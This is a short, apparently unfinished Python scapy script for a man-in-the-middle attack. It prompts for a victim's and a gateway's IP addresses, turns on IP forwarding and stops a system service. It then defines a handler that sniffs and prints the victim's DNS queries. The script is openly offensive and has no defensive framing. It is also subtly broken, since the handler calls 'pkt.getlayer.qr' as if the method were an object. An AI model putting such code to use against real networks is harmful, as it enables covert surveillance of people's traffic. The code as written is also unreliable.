from scapy.all import *
import threading
import os
import sys

print("Are you run with root previledges? ")
VIP = input("Enter the IP address of the victim: ")
GW = input("Enter the IP address of the gateway: ")
IFACE = input("Enter the name of the interface (ex: eth0): ")

print("\tPoisoning victim machine & gateway.........")
os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
os.system('service whoopsie stop')


def dnshandle(pkt):
    if pkt.haslayer(DNS) and pkt.getlayer.qr== 0:
        print("Victim: " + VIP + "has searched for: " + pkt.getlayer(DNS).qd.qname)